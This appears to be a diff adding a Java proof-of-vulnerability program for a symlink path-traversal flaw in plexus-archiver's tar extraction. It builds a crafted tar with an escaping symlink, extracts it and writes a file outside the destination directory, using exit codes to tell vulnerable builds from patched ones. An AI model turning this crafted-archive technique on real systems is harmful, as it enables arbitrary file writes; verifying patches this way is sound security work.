+import java.io.File;
+import java.io.OutputStream;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+
+import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
+import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
+import org.apache.commons.compress.archivers.tar.TarConstants;
+import org.codehaus.plexus.archiver.tar.TarUnArchiver;
+
+/**
+ * Proof of vulnerability for CWE-022 (CVE-2023-37460 aligned) in plexus-archiver.
+ *
+ * TarUnArchiver.extractFile() validates that the *location* of an extracted entry
+ * stays inside the destination directory, but it does NOT validate the *target* of
+ * a symbolic-link entry. A crafted tar containing a symlink whose link name points
+ * outside the destination therefore causes AbstractUnArchiver to create a symlink
+ * that escapes the extraction directory (the CWE-022 sink at
+ * AbstractUnArchiver.java:371 -> SymlinkUtils.createSymbolicLink(..., new File(symlinkDestination))).
+ *
+ * A downstream consumer that later writes through that archive-created symlink then
+ * writes arbitrary files OUTSIDE the destination directory. This program demonstrates
+ * that end-to-end.
+ *
+ * Vulnerable (unpatched) code  -> escaping symlink is created, arbitrary write escapes -> exit 0
+ * Patched code                 -> symlink creation is rejected / made safe            -> exit non-zero
+ */
+public class PovSymlinkEscape
+{
+    public static void main( String[] args ) throws Exception
+    {
+        File repo = new File( "." ).getCanonicalFile();
+        File workRoot = new File( repo, "target/pov-work" );
+        deleteRecursively( workRoot );
+
+        File dest = new File( workRoot, "dest" );              // extraction destination
+        File escapeZone = new File( workRoot, "escape-zone" ); // OUTSIDE dest (sibling)
+        dest.mkdirs();
+        escapeZone.mkdirs();
+
+        File tarFile = new File( workRoot, "evil.tar" );
+
+        // Build a tar whose single entry is a symlink "evil" -> <escapeZone> (an
+        // absolute path outside the destination directory).
+        try ( TarArchiveOutputStream tos =
+                  new TarArchiveOutputStream( Files.newOutputStream( tarFile.toPath() ) ) )
+        {
+            tos.setLongFileMode( TarArchiveOutputStream.LONGFILE_POSIX );
+            TarArchiveEntry link = new TarArchiveEntry( "evil", TarConstants.LF_SYMLINK );
+            link.setLinkName( escapeZone.getCanonicalPath() );
+            tos.putArchiveEntry( link );
+            tos.closeArchiveEntry();
+        }
+
+        // Extract with the project's own TarUnArchiver.
+        TarUnArchiver un = new TarUnArchiver();
+        un.setSourceFile( tarFile );
+        un.setDestDirectory( dest );
+        try
+        {
+            un.extract();
+        }
+        catch ( Exception e )
+        {
+            System.out.println( "[POV] Extraction rejected the escaping symlink: "
+                + e.getClass().getName() + ": " + e.getMessage() );
+            System.out.println( "[POV] NOT VULNERABLE (patched behaviour)." );
+            System.exit( 2 );
+        }
+
+        File createdLink = new File( dest, "evil" );
+        Path canonicalDest = dest.getCanonicalFile().toPath();
+
+        if ( !Files.isSymbolicLink( createdLink.toPath() ) )
+        {
+            System.out.println( "[POV] No symlink was created inside the destination." );
+            System.out.println( "[POV] NOT VULNERABLE." );
+            System.exit( 3 );
+        }
+
+        // Resolve the raw symlink target (getCanonicalFile is unreliable across the
+        // Docker bind-mount, so read the link target directly).
+        Path rawTarget = Files.readSymbolicLink( createdLink.toPath() );
+        Path linkTarget;
+        if ( rawTarget.isAbsolute() )
+        {
+            linkTarget = rawTarget.normalize();
+        }
+        else
+        {
+            linkTarget = createdLink.toPath().getParent().resolve( rawTarget ).normalize();
+        }
+        boolean escapes = !linkTarget.startsWith( canonicalDest );
+        System.out.println( "[POV] Created symlink: " + createdLink );
+        System.out.println( "[POV]   -> points to: " + linkTarget );
+        System.out.println( "[POV]   destination dir: " + canonicalDest );
+        System.out.println( "[POV]   escapes destination? " + escapes );
+
+        if ( !escapes )
+        {
+            System.out.println( "[POV] Symlink was contained inside the destination." );
+            System.out.println( "[POV] NOT VULNERABLE." );
+            System.exit( 4 );
+        }
+
+        // Demonstrate concrete impact: a downstream consumer writing through the
+        // archive-created symlink escapes the destination and writes an arbitrary
+        // file outside of it.
+        File payloadViaLink = new File( createdLink, "pwned.txt" );
+        try ( OutputStream out = Files.newOutputStream( payloadViaLink.toPath() ) )
+        {
+            out.write( "arbitrary-file-write-outside-destination".getBytes( StandardCharsets.UTF_8 ) );
+        }
+
+        File escaped = new File( escapeZone, "pwned.txt" );
+        Path escapedPath = escaped.getCanonicalFile().toPath().normalize();
+        boolean wroteOutside = Files.exists( escapedPath ) && !escapedPath.startsWith( canonicalDest );
+
+        if ( wroteOutside )
+        {
+            System.out.println( "[POV] Arbitrary file written OUTSIDE destination: "
+                + escaped.getCanonicalPath() );
+            System.out.println( "[POV] VULNERABLE: archive-created symlink escaped the destination directory." );
+            System.exit( 0 );
+        }
+
+        System.out.println( "[POV] Escape write did not land outside the destination." );
+        System.out.println( "[POV] NOT VULNERABLE." );
+        System.exit( 5 );
+    }
+
+    private static void deleteRecursively( File f ) throws Exception
+    {
+        if ( !f.exists() )
+        {
+            return;
+        }
+        if ( Files.isSymbolicLink( f.toPath() ) )
+        {
+            f.delete();
+            return;
+        }
+        if ( f.isDirectory() )
+        {
+            File[] kids = f.listFiles();
+            if ( kids != null )
+            {
+                for ( File k : kids )
+                {
+                    deleteRecursively( k );
+                }
+            }
+        }
+        f.delete();
+    }
+}
